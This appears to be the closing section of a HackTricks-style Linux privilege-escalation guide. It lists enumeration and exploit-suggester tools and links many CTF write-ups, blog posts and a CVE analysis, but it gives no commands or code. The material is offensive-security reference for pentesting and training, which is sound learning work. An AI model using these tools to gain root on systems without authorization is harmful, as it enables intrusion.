**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
